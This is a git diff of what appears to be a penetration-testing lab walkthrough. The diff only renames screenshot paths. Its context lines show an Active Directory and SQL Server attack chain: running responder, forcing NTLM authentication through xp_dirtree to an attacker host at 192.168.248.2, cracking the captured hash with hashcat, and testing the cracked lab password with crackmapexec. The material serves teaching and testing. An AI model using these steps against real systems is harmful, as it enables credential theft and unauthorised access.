@@ -122,7 +122,7 @@ sudo responder -I eth0
 Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query "EXEC xp_dirtree '\\192.168.248.2\pwn', 1, 1" -QueryTarget DATA01\DATA
 ```
 
-![](<../../../.gitbook/assets/image (69) (1).png>)
+![](<../../../.gitbook/assets/image (69) (1) (1).png>)
 
 3\. We captured the NTLMV2 hash from `SECURE\sa_sql`. We can try to crack it using hashcat. Save the following in a hash.txt file and run the following hashcat command.
 
@@ -136,7 +136,7 @@ hashcat -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt
 
 Hashcat cracked it within second since the user has a weak password:
 
-![](<../../../.gitbook/assets/image (70) (1) (1).png>)
+![](<../../../.gitbook/assets/image (70) (1) (1) (1).png>)
 
 4\. The password for `sa_sql` is `IIoveyou2`. We can check if we can access the SQL Server with this account using crackmapexec, which will authenticate over SMB. If it shows Pwn3d we are localadmin.
 
